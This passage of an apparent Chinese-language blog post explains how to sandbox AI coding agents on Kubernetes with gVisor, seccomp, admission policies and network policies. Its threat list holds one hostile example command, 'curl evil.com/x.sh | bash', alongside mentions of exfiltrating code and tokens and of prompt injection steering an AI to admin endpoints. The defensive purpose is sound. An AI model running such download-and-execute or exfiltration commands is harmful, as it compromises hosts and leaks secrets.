+<p>这套配置<strong>完全对应</strong> Codex 单机 sandbox 的几个核心约束：</p>
+<ul>
+<li><code>runAsNonRoot + capabilities.drop: ALL</code>：等价于 Linux sandbox 的 <code>PR_SET_NO_NEW_PRIVS</code> + 禁 <code>setuid</code></li>
+<li><code>readOnlyRootFilesystem</code>：等价于 bwrap 的 <code>--ro-bind / /</code></li>
+<li><code>volumes.workspace</code>：等价于 bwrap 的 <code>--bind /workspace /workspace</code></li>
+<li><code>seccompProfile: RuntimeDefault</code>：等价于 Codex 在 bwrap 里挂的 seccomp 网络过滤（实际更严，覆盖更多 syscall）</li>
+</ul>
+<p>这一层是基础，便宜、立刻生效，每个 pod 都该有。<strong>但还不够</strong>——只要还在 runc，就还是和宿主共享内核。</p>
+<h3 id="2-3-gVisor-Kata-Containers：把内核也隔离了"><a href="#2-3-gVisor-Kata-Containers：把内核也隔离了" class="headerlink" title="2.3 gVisor / Kata Containers：把内核也隔离了"></a>2.3 gVisor / Kata Containers：把内核也隔离了</h3><p><img src="illustrations/F4-gVisor%E6%9E%B6%E6%9E%84%E5%AF%B9%E6%AF%94.webp" alt="runc vs gVisor vs Kata：三种容器运行时的隔离强度对比"></p>
+<p>K8s 标准的容器运行时是 <strong>runc</strong>（Open Container Initiative 的参考实现，本质就是 namespace + cgroup + seccomp 的封装）。这玩意快、稳，但有一个根本问题：<strong>容器和宿主共享同一个 Linux 内核</strong>。</p>
+<p>历史上的容器逃逸漏洞 90% 都是利用了内核 syscall 漏洞：</p>
+<ul>
+<li><strong>Dirty COW</strong>（CVE-2016-5195）：内存写时复制条件竞争</li>
+<li><strong>Dirty Pipe</strong>（CVE-2022-0847）：pipe buffer 越权写</li>
+<li><strong>CVE-2022-0492</strong>：cgroup release_agent 利用</li>
+<li><strong>CVE-2024-1086</strong>：netfilter UAF</li>
+</ul>
+<p>每出一个，所有用 runc 的容器集群一夜之间裸奔。</p>
+<p>解决思路有两条：</p>
+<p><strong>第一条：gVisor</strong>（Google 出品，用户态内核）。在容器和宿主之间插一个叫 <strong>Sentry</strong> 的进程，Sentry 用 Go 写、跑在用户态、自己实现了 ~200 个 syscall。容器进程发的 syscall 先被 <strong>Systrap</strong>（gVisor 当前默认拦截机制，基于 seccomp + signal，比早期的 ptrace 平台快很多）或 KVM 拦截，转给 Sentry 处理；只有 Sentry 觉得安全的少数 syscall 才会真的走到宿主内核。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────┐</span><br><span class="line">│  Container Process (your codex)     │</span><br><span class="line">│              │                      │</span><br><span class="line">│              │ syscall              │</span><br><span class="line">│              ▼                      │</span><br><span class="line">│  ┌─────────────────────────────┐    │</span><br><span class="line">│  │  Sentry (user-space kernel) │    │  ← gVisor 的核心</span><br><span class="line">│  │  自己实现 ~200 个 syscall    │    │</span><br><span class="line">│  └──────────────┬──────────────┘    │</span><br><span class="line">│                 │                   │</span><br><span class="line">│                 │ 极少数转发        │</span><br><span class="line">│                 ▼                   │</span><br><span class="line">│  ┌─────────────────────────────┐    │</span><br><span class="line">│  │  Host Linux Kernel          │    │  ← 暴露面收窄到 &lt; 50 个 syscall</span><br><span class="line">│  └─────────────────────────────┘    │</span><br><span class="line">└─────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p>效果：容器内即使利用了 Dirty Pipe 这种 syscall 漏洞，攻击只到 Sentry 这一层就被吸收了，宿主内核根本没机会被触发。代价：syscall-heavy 的负载（比如编译大型项目）性能下降 10~30%，少数 syscall（io_uring 等高级特性）不支持。</p>
+<p>K8s 里启用 gVisor 只要装一个 RuntimeClass：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">node.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RuntimeClass</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">gvisor</span></span><br><span class="line"><span class="attr">handler:</span> <span class="string">runsc</span>                  <span class="comment"># gVisor 的运行时叫 runsc</span></span><br></pre></td></tr></table></figure>
+
+<p>然后 Pod spec 里加一行 <code>runtimeClassName: gvisor</code> 就行。</p>
+<p><strong>第二条：Kata Containers</strong>（OpenInfra Foundation 旗下，由 Intel Clear Containers 和 Hyper.sh runV 合并而来，微 VM 方案）。每个 pod 跑在一个独立的轻量级 VM 里，VM 里有自己的 Linux kernel。隔离强度比 gVisor 还高（每个 pod 一个 kernel），代价是启动慢（500ms~2s），内存开销大（每个 VM 至少几十 MB）。</p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>runc</th>
+<th>gVisor</th>
+<th>Kata</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>启动延迟</td>
+<td>&lt; 100ms</td>
+<td>~200ms</td>
+<td>500ms~2s</td>
+</tr>
+<tr>
+<td>内存开销</td>
+<td>几乎无</td>
+<td>~20MB</td>
+<td>几十~几百 MB</td>
+</tr>
+<tr>
+<td>syscall 覆盖</td>
+<td>100%</td>
+<td>~80%（高级特性不支持）</td>
+<td>100%（独立 kernel）</td>
+</tr>
+<tr>
+<td>隔离强度</td>
+<td>弱（共享 kernel）</td>
+<td>强（用户态 kernel 拦截）</td>
+<td>极强（独立 kernel + VM）</td>
+</tr>
+<tr>
+<td>性能（计算）</td>
+<td>100%</td>
+<td>95~100%</td>
+<td>95~100%</td>
+</tr>
+<tr>
+<td>性能（syscall 密集）</td>
+<td>100%</td>
+<td>70~90%</td>
+<td>90~95%</td>
+</tr>
+<tr>
+<td>适合场景</td>
+<td>内部受信负载</td>
+<td><strong>AI agent / 多租户代码执行 ← Codex 选这个</strong></td>
+<td>极敏感数据处理、政府/金融</td>
+</tr>
+</tbody></table>
+<p><strong>实战建议</strong>：Codex AI agent 跑在 <strong>gVisor</strong> 上是最佳点。AI 跑的负载主要是 git/编辑器/编译/测试，对个别 syscall 的兼容性没那么敏感，但你需要它对未知 prompt injection 的鲁棒性。Kata 太重，runc 太险。</p>
+<h3 id="2-4-自定义-Seccomp-Profile：syscall-级精准白名单"><a href="#2-4-自定义-Seccomp-Profile：syscall-级精准白名单" class="headerlink" title="2.4 自定义 Seccomp Profile：syscall 级精准白名单"></a>2.4 自定义 Seccomp Profile：syscall 级精准白名单</h3><p><code>seccompProfile.type: RuntimeDefault</code> 已经很好了，但你可以更紧。比如，AI agent 不应该需要 <code>mount</code>、<code>reboot</code>、<code>kexec_load</code> 这些 syscall。写个 JSON profile（下面是节选骨架，<strong>实际生产白名单一般在 80-150 个 syscall 之间</strong>，建议从 RuntimeDefault 的源码 fork 出来再剪枝）：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;defaultAction&quot;</span>: <span class="string">&quot;SCMP_ACT_ERRNO&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;syscalls&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;names&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;read&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="string">&quot;stat&quot;</span>, <span class="string">&quot;fstat&quot;</span>, <span class="string">&quot;lstat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;execve&quot;</span>, <span class="string">&quot;fork&quot;</span>, <span class="string">&quot;clone&quot;</span>, <span class="string">&quot;wait4&quot;</span>, <span class="string">&quot;exit_group&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;SCMP_ACT_ALLOW&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>放到 K8s 节点的 <code>/var/lib/kubelet/seccomp/profiles/codex-agent.json</code>，然后 pod 里用 <code>localhostProfile</code>：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">seccompProfile:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">Localhost</span></span><br><span class="line">  <span class="attr">localhostProfile:</span> <span class="string">profiles/codex-agent.json</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>实战经验</strong>：自定义 seccomp profile 是最容易翻车的地方。开始时<strong>别上手就写白名单</strong>，用 <code>audit</code> 模式跑一周，把实际触发的 syscall 都收集起来，再加一些（不要少）。</p>
+<hr>
+<h2 id="3-OPA-Gatekeeper-Kyverno：把-execpolicy-升级成集群准入"><a href="#3-OPA-Gatekeeper-Kyverno：把-execpolicy-升级成集群准入" class="headerlink" title="3. OPA Gatekeeper / Kyverno：把 execpolicy 升级成集群准入"></a>3. OPA Gatekeeper / Kyverno：把 execpolicy 升级成集群准入</h2><p>Codex 单机的 execpolicy 是<strong>进程级</strong>的策略：AI 想跑某条命令，先问规则。</p>
+<p>到了集群里，需要的是<strong>资源级</strong>的策略：AI 想创建某个 Pod、某个 Job、某个 ConfigMap，先问规则。这一层叫<strong>准入控制器</strong>（admission controller，K8s API server 在写入 etcd 之前的最后一道关）。</p>
+<p><img src="illustrations/F5-OPA%E5%87%86%E5%85%A5%E6%B5%81%E7%A8%8B.webp" alt="OPA Gatekeeper 准入控制流程：从 kubectl 到 etcd 的策略评估链路"></p>
+<p>业界两个主流方案：<strong>OPA Gatekeeper</strong> 和 <strong>Kyverno</strong>。</p>
+<h3 id="3-1-OPA-Gatekeeper：用-Rego-写策略"><a href="#3-1-OPA-Gatekeeper：用-Rego-写策略" class="headerlink" title="3.1 OPA Gatekeeper：用 Rego 写策略"></a>3.1 OPA Gatekeeper：用 Rego 写策略</h3><p><strong>Rego</strong> 是 OPA（Open Policy Agent，CNCF 毕业项目，通用策略引擎）的 DSL。学习曲线略陡但表达力强。</p>
+<p>定义一个策略模板（ConstraintTemplate）：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">templates.gatekeeper.sh/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ConstraintTemplate</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">k8scodexallowedimages</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">crd:</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">names:</span></span><br><span class="line">        <span class="attr">kind:</span> <span class="string">K8sCodexAllowedImages</span></span><br><span class="line">      <span class="attr">validation:</span></span><br><span class="line">        <span class="attr">openAPIV3Schema:</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">object</span></span><br><span class="line">          <span class="attr">properties:</span></span><br><span class="line">            <span class="attr">allowedRegistries:</span></span><br><span class="line">              <span class="attr">type:</span> <span class="string">array</span></span><br><span class="line">              <span class="attr">items:</span></span><br><span class="line">                <span class="attr">type:</span> <span class="string">string</span></span><br><span class="line">  <span class="attr">targets:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">target:</span> <span class="string">admission.k8s.gatekeeper.sh</span></span><br><span class="line">    <span class="attr">rego:</span> <span class="string">|</span></span><br><span class="line">      <span class="string">package</span> <span class="string">k8scodexallowedimages</span></span><br><span class="line"></span><br><span class="line">      <span class="string">violation[&#123;&quot;msg&quot;:</span> <span class="string">msg&#125;]</span> &#123;</span><br><span class="line">        <span class="string">container</span> <span class="string">:=</span> <span class="string">input.review.object.spec.containers</span>[<span class="string">_</span>]</span><br><span class="line">        <span class="string">not</span> <span class="string">starts_with_allowed(container.image)</span></span><br><span class="line">        <span class="string">msg</span> <span class="string">:=</span> <span class="string">sprintf(&quot;Codex</span> <span class="string">pod</span> <span class="string">镜像必须来自允许的</span> <span class="string">registry，得到</span> <span class="string">%v&quot;</span>, [<span class="string">container.image</span>]<span class="string">)</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="string">starts_with_allowed(image)</span> &#123;</span><br><span class="line">        <span class="string">registry</span> <span class="string">:=</span> <span class="string">input.parameters.allowedRegistries</span>[<span class="string">_</span>]</span><br><span class="line">        <span class="string">startswith(image</span>, <span class="string">registry)</span></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后实例化策略：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">constraints.gatekeeper.sh/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">K8sCodexAllowedImages</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">codex-images-only-from-internal</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">match:</span></span><br><span class="line">    <span class="attr">kinds:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">      <span class="attr">kinds:</span> [<span class="string">&quot;Pod&quot;</span>]</span><br><span class="line">    <span class="attr">namespaces:</span> [<span class="string">&quot;codex-runtime&quot;</span>]</span><br><span class="line">  <span class="attr">parameters:</span></span><br><span class="line">    <span class="attr">allowedRegistries:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;registry.company.internal/codex/&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;registry.company.internal/sandbox-base/&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果：在 <code>codex-runtime</code> namespace 里创建任何 Pod，镜像不来自公司内部 registry 就直接被拒。这意味着 AI 无论多想拉 Docker Hub 上的恶意镜像都没用——准入这一层就阻了。</p>
+<h3 id="3-2-Kyverno：用-YAML-写策略"><a href="#3-2-Kyverno：用-YAML-写策略" class="headerlink" title="3.2 Kyverno：用 YAML 写策略"></a>3.2 Kyverno：用 YAML 写策略</h3><p>如果你嫌 Rego 不友好，<strong>Kyverno</strong>（Nirmata 出品，K8s 原生策略引擎）允许你直接用 YAML 写策略：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">kyverno.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">codex-pod-must-use-gvisor</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">validationFailureAction:</span> <span class="string">Enforce</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">require-gvisor-runtime</span></span><br><span class="line">    <span class="attr">match:</span></span><br><span class="line">      <span class="attr">any:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">kinds:</span> [<span class="string">&quot;Pod&quot;</span>]</span><br><span class="line">          <span class="attr">namespaces:</span> [<span class="string">&quot;codex-runtime&quot;</span>]</span><br><span class="line">    <span class="attr">validate:</span></span><br><span class="line">      <span class="attr">message:</span> <span class="string">&quot;Codex pod 必须使用 gVisor 运行时&quot;</span></span><br><span class="line">      <span class="attr">pattern:</span></span><br><span class="line">        <span class="attr">spec:</span></span><br><span class="line">          <span class="attr">runtimeClassName:</span> <span class="string">gvisor</span></span><br></pre></td></tr></table></figure>
+
+<p>YAML 的可读性高，对运维团队友好。Kyverno 还能做 <strong>mutation</strong>（自动改写 pod spec）和 <strong>generation</strong>（创建关联资源），比 OPA Gatekeeper 功能更全。<strong>生产建议：新项目优先 Kyverno，已有 Rego 资产的可以继续 OPA</strong>。</p>
+<h3 id="3-3-把-Codex-execpolicy-的精神搬过来"><a href="#3-3-把-Codex-execpolicy-的精神搬过来" class="headerlink" title="3.3 把 Codex execpolicy 的精神搬过来"></a>3.3 把 Codex execpolicy 的精神搬过来</h3><p>execpolicy 的几个核心特征——<code>allow / prompt / forbidden</code> 三档、规则自带测试用例、规则带 justification——都能在 OPA / Kyverno 上重现：</p>
+<table>
+<thead>
+<tr>
+<th>Codex execpolicy</th>
+<th>K8s admission 等价</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>decision = &quot;allow&quot;</code></td>
+<td>准入通过</td>
+</tr>
+<tr>
+<td><code>decision = &quot;prompt&quot;</code></td>
+<td>mutation 加 label <code>requires-approval=true</code>，由独立的 approval controller 处理</td>
+</tr>
+<tr>
+<td><code>decision = &quot;forbidden&quot;</code></td>
+<td>准入拒绝 + 返回 <code>justification</code> 文本</td>
+</tr>
+<tr>
+<td><code>match / not_match</code> 自带测试</td>
+<td>Kyverno test (<code>kyverno test</code>) / OPA conftest</td>
+</tr>
+<tr>
+<td><code>justification</code></td>
+<td>Policy 的 <code>validate.message</code> 字段</td>
+</tr>
+</tbody></table>
+<p><strong>实战经验</strong>：把 execpolicy 的规则文件作为单一信源，用一个脚本自动生成 OPA 和 Kyverno 的策略。规则文件改动只在一处，下游策略自动同步。这避免了”两份策略不一致”这种灾难性配置问题。</p>
+<hr>
+<h2 id="4-网络隔离：AI-Pod-能上哪些网"><a href="#4-网络隔离：AI-Pod-能上哪些网" class="headerlink" title="4. 网络隔离：AI Pod 能上哪些网"></a>4. 网络隔离：AI Pod 能上哪些网</h2><p>Sandbox 里所有事情都做对了，AI 还是能干一件最危险的事：<strong>联网</strong>。</p>
+<ul>
+<li>把代码上传到 attacker.com</li>
+<li>拉一个恶意脚本 <code>curl evil.com/x.sh | bash</code></li>
+<li>把公司内部 LLM gateway 的 token 转发出去</li>
+<li>DNS 隧道（用 DNS query 当 covert channel 传数据）</li>
+</ul>
+<p>K8s 默认网络是<strong>全开放</strong>的——任何 Pod 默认能访问任何其他 Pod、任何外网。生产环境必须<strong>默认全拒，显式开窗口</strong>。</p>
+<p><img src="illustrations/F6-%E7%BD%91%E7%BB%9C%E7%AD%96%E7%95%A5%E5%88%86%E5%B1%82.webp" alt="K8s 网络隔离三层：NetworkPolicy + Cilium L7 + Egress Gateway"></p>
+<h3 id="4-1-NetworkPolicy：K8s-内置但能力有限"><a href="#4-1-NetworkPolicy：K8s-内置但能力有限" class="headerlink" title="4.1 NetworkPolicy：K8s 内置但能力有限"></a>4.1 NetworkPolicy：K8s 内置但能力有限</h3><p>K8s 自带 <code>NetworkPolicy</code>，但你需要一个支持它的 CNI（Calico、Cilium、Antrea，<strong>Flannel 默认不支持</strong>）。</p>
+<p>第一条规则永远是”全拒”:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">NetworkPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">deny-all-by-default</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">codex-runtime</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">podSelector:</span> &#123;&#125;                  <span class="comment"># 选中 namespace 内所有 pod</span></span><br><span class="line">  <span class="attr">policyTypes:</span> [<span class="string">&quot;Ingress&quot;</span>, <span class="string">&quot;Egress&quot;</span>]</span><br><span class="line">  <span class="comment"># 没写任何 ingress / egress 规则 = 全拒</span></span><br></pre></td></tr></table></figure>
+
+<p>然后逐项允许 AI Pod 真正需要访问的服务：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">NetworkPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">codex-allow-llm-gateway</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">codex-runtime</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">podSelector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">codex-runner</span></span><br><span class="line">  <span class="attr">policyTypes:</span> [<span class="string">&quot;Egress&quot;</span>]</span><br><span class="line">  <span class="attr">egress:</span></span><br><span class="line">  <span class="comment"># 允许访问公司 LLM Gateway</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">to:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">namespaceSelector:</span></span><br><span class="line">        <span class="attr">matchLabels:</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">llm-gateway</span></span><br><span class="line">      <span class="attr">podSelector:</span></span><br><span class="line">        <span class="attr">matchLabels:</span></span><br><span class="line">          <span class="attr">app:</span> <span class="string">gateway</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">  <span class="comment"># 允许 DNS（必需）</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">to:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">namespaceSelector:</span></span><br><span class="line">        <span class="attr">matchLabels:</span></span><br><span class="line">          <span class="attr">kubernetes.io/metadata.name:</span> <span class="string">kube-system</span></span><br><span class="line">      <span class="attr">podSelector:</span></span><br><span class="line">        <span class="attr">matchLabels:</span></span><br><span class="line">          <span class="attr">k8s-app:</span> <span class="string">kube-dns</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">protocol:</span> <span class="string">UDP</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">53</span></span><br></pre></td></tr></table></figure>
+
+<p>NetworkPolicy 是 L3/L4 的（IP + 端口），它不知道 HTTP path 是什么、SQL 语句是什么。要做 L7 隔离，需要 Cilium 或 Service Mesh。</p>
+<h3 id="4-2-Cilium：L7-网络策略"><a href="#4-2-Cilium：L7-网络策略" class="headerlink" title="4.2 Cilium：L7 网络策略"></a>4.2 Cilium：L7 网络策略</h3><p><strong>Cilium</strong>（Isovalent 出品，eBPF-based CNI，2023 年 CNCF 毕业）支持 L7 NetworkPolicy。比如，AI Pod 只允许调 LLM Gateway 的 <code>/v1/chat/completions</code>，不允许调 <code>/admin/*</code>：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">cilium.io/v2</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">CiliumNetworkPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">codex-llm-l7</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">codex-runtime</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">endpointSelector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">codex-runner</span></span><br><span class="line">  <span class="attr">egress:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">toEndpoints:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">matchLabels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">gateway</span></span><br><span class="line">        <span class="attr">io.kubernetes.pod.namespace:</span> <span class="string">llm-gateway</span></span><br><span class="line">    <span class="attr">toPorts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">port:</span> <span class="string">&quot;443&quot;</span></span><br><span class="line">        <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">      <span class="attr">rules:</span></span><br><span class="line">        <span class="attr">http:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">&quot;POST&quot;</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">&quot;/v1/chat/completions&quot;</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">&quot;POST&quot;</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">&quot;/v1/messages&quot;</span></span><br><span class="line">        <span class="comment"># /admin/* 不在白名单 = 拒绝</span></span><br></pre></td></tr></table></figure>
+
+<p>L7 策略能挡住一类常见的 AI 越权——比如 prompt injection 让 AI 去调 <code>/admin/delete-user</code>，即使 token 有权限，请求也到不了网络层。</p>
+<h3 id="4-3-Egress-Gateway：所有出口经过固定-IP"><a href="#4-3-Egress-Gateway：所有出口经过固定-IP" class="headerlink" title="4.3 Egress Gateway：所有出口经过固定 IP"></a>4.3 Egress Gateway：所有出口经过固定 IP</h3><p>公司外网访问通常需要走代理 + 审计。<strong>Egress Gateway</strong>（出口网关，所有 pod 出公网的流量都先到这个 gateway 节点再出去）让你能：</p>
+<ul>
+<li>所有出公网的流量从单一 IP 出去（防火墙白名单只用配一个 IP）</li>
+<li>在 gateway 上做 DNS 审计、域名白名单</li>
+<li>阻断已知恶意域名（结合 threat intel）</li>
+</ul>
+<p>Cilium 的 Egress Gateway 配置：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">cilium.io/v2</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">CiliumEgressGatewayPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">codex-egress-via-gateway</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span 